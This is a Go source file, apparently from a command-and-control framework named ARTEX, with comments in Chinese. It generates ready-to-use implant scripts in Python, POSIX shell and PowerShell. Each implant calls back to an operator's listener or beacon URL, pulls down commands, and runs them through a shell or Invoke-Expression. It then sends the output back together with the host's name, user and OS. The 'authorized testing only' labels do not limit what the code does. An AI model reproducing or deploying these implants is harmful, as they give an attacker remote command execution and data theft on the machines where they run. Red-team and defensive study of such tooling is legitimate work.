package c2

// 载荷：生成植入端脚本模板（Python，最小实现，便于内网快速验证）。
// 模板只包含与平台协议一致的最小逻辑：上线 → 收任务 → 执行 → 回结果 → 心跳。

import "fmt"

// PythonImplant 返回一个最小 Python 植入端脚本模板。
func PythonImplant(listenerAddr, token, keyB64, implantID string) string {
	return fmt.Sprintf(pyImplantTmpl, listenerAddr, token, keyB64, implantID)
}

const pyImplantTmpl = `#!/usr/bin/env python3
# ARTEX C2 minimal implant (authorized testing only)
import base64, json, os, socket, struct, subprocess, threading, time

ADDR = %q
TOKEN = %q
KEY = base64.b64decode(%q)
IMPLANT_ID = %q

def frame(t, i, p):
    return struct.pack(">IBI", 5 + len(p), t, i) + p

def read_frame(sock):
    hdr = b""
    while len(hdr) < 9:
        b = sock.recv(9 - len(hdr))
        if not b:
            raise ConnectionError("closed")
        hdr += b
    ln, typ, fid = struct.unpack(">IBI", hdr)
    body = b""
    while len(body) < ln - 5:
        b = sock.recv(ln - 5 - len(body))
        if not b:
            raise ConnectionError("closed")
        body += b
    return typ, fid, body

# GCM envelope over raw socket is non-trivial in stdlib; this template uses
# AES-GCM via cryptography when available, otherwise falls back to plaintext
# JSON (lab-only; do not use plaintext mode outside an isolated lab).
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    _GCM = AESGCM(KEY)
except Exception:
    _GCM = None

def seal(plain):
    if _GCM is None:
        return plain
    nonce = os.urandom(12)
    return nonce + _GCM.encrypt(nonce, plain, None)

def open_(blob):
    if _GCM is None:
        return blob
    return _GCM.decrypt(blob[:12], blob[12:], None)

def main():
    while True:
        try:
            sock = socket.create_connection(tuple(ADDR.rsplit(":", 1)[0:1]) + (int(ADDR.rsplit(":", 1)[1]),), timeout=30)
            hello = {"token": TOKEN, "key": base64.b64encode(KEY).decode(), "id": IMPLANT_ID,
                     "os": os.name, "arch": "py", "user": os.getenv("USER", "")}
            sock.sendall(frame(1, 0, json.dumps(hello).encode()))
            ty, fid, body = read_frame(sock)
            while True:
                try:
                    ty, fid, body = read_frame(sock)
                except ConnectionError:
                    break
                if ty == 3:
                    task = json.loads(open_(body))
                    try:
                        out = subprocess.run(task.get("args", ""), shell=True, capture_output=True, timeout=task.get("timeout_sec", 60))
                        res = {"task_id": fid, "exit_code": out.returncode, "output": (out.stdout + out.stderr).decode(errors="replace")}
                    except Exception as e:
                        res = {"task_id": fid, "exit_code": -1, "output": "", "err": str(e)}
                    sock.sendall(frame(4, fid, seal(json.dumps(res).encode())))
                elif ty == 5:
                    pass
        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    main()
`

// HTTP 植入端模板（P1-6）：轮询 /c2/beacon/<token>，拉取任务并回传结果。
// baseURL 形如 http://10.0.0.1:8443（生成 API 可用 base_url 覆盖 NAT 地址）。

func HTTPImplantPython(baseURL, token string) string {
	return fmt.Sprintf(httpPyTmpl, baseURL, token)
}

const httpPyTmpl = `#!/usr/bin/env python3
# ARTEX C2 HTTP beacon implant (authorized testing only)
import json, os, platform, socket, subprocess, time, urllib.request, uuid

BASE = %q
TOKEN = %q
UUID = uuid.uuid4().hex[:12]

def send(payload):
    req = urllib.request.Request(BASE.rstrip("/") + "/c2/beacon/" + TOKEN,
                                 data=json.dumps(payload).encode(),
                                 headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=30) as resp:
        return json.loads(resp.read() or b"{}")

def main():
    while True:
        delay = 30
        try:
            resp = send({"implant_uuid": UUID, "hostname": socket.gethostname(),
                         "os": platform.system(), "arch": platform.machine(),
                         "username": os.getenv("USER", "")})
            delay = int(resp.get("heartbeat_sec") or 30)
            task = resp.get("task")
            if task:
                try:
                    out = subprocess.run(task.get("args", ""), shell=True, capture_output=True, timeout=60)
                    send({"implant_uuid": UUID, "task_id": task.get("id"),
                          "ok": out.returncode == 0,
                          "output": (out.stdout + out.stderr).decode(errors="replace")})
                except Exception as exc:
                    send({"implant_uuid": UUID, "task_id": task.get("id"), "ok": False, "error": str(exc)})
        except Exception:
            pass
        time.sleep(delay)

if __name__ == "__main__":
    main()
`

func HTTPImplantBash(baseURL, token string) string {
	return fmt.Sprintf(httpBashTmpl, baseURL, token)
}

const httpBashTmpl = `#!/bin/sh
# ARTEX C2 HTTP beacon implant (authorized testing only)
BASE=%q
TOKEN=%q
UUID="$(hostname)-$$"
beacon() {
  curl -s --max-time 30 -H "Content-Type: application/json" -X POST -d "$1" "$BASE/c2/beacon/$TOKEN"
}
while :; do
  RESP=$(beacon "{"implant_uuid":"$UUID","hostname":"$(hostname)","os":"posix","arch":"sh","username":"$(whoami 2>/dev/null)"}") || RESP=""
  TASK_ID=$(printf '%%s' "$RESP" | sed -n 's/.*"task":{"id":\([0-9][0-9]*\).*//p')
  ARGS=$(printf '%%s' "$RESP" | sed -n 's/.*"args":"\([^"]*\)".*//p')
  if [ -n "$TASK_ID" ]; then
    OUT=$(sh -c "$ARGS" 2>&1)
    CODE=$?
    ESC=$(printf '%%s' "$OUT" | sed 's/\/\\/g; s/"/\"/g' | tr '
' ' ')
    if [ "$CODE" -eq 0 ]; then OK=true; else OK=false; fi
    beacon "{"implant_uuid":"$UUID","task_id":$TASK_ID,"ok":$OK,"output":"$ESC"}" >/dev/null
  fi
  sleep 15
done
`

func HTTPImplantPowerShell(baseURL, token string) string {
	return fmt.Sprintf(httpPSTmpl, baseURL, token)
}

const httpPSTmpl = `# ARTEX C2 HTTP beacon implant (authorized testing only)
$BASE = %q
$TOKEN = %q
$UUID = [guid]::NewGuid().ToString("N").Substring(0, 12)
$Uri = $BASE.TrimEnd("/") + "/c2/beacon/" + $TOKEN
while ($true) {
  try {
    $body = @{ implant_uuid = $UUID; hostname = $env:COMPUTERNAME; os = "windows";
               arch = $env:PROCESSOR_ARCHITECTURE; username = $env:USERNAME } | ConvertTo-Json -Compress
    $resp = Invoke-RestMethod -Method Post -Uri $Uri -ContentType "application/json" -Body $body -TimeoutSec 30
    if ($resp.task) {
      $out = try { (Invoke-Expression $resp.task.args) 2>&1 | Out-String } catch { "$_" }
      $r = @{ implant_uuid = $UUID; task_id = $resp.task.id; ok = $true; output = $out } | ConvertTo-Json -Compress
      Invoke-RestMethod -Method Post -Uri $Uri -ContentType "application/json" -Body $r -TimeoutSec 30 | Out-Null
    }
  } catch { }
  Start-Sleep -Seconds 15
}
`
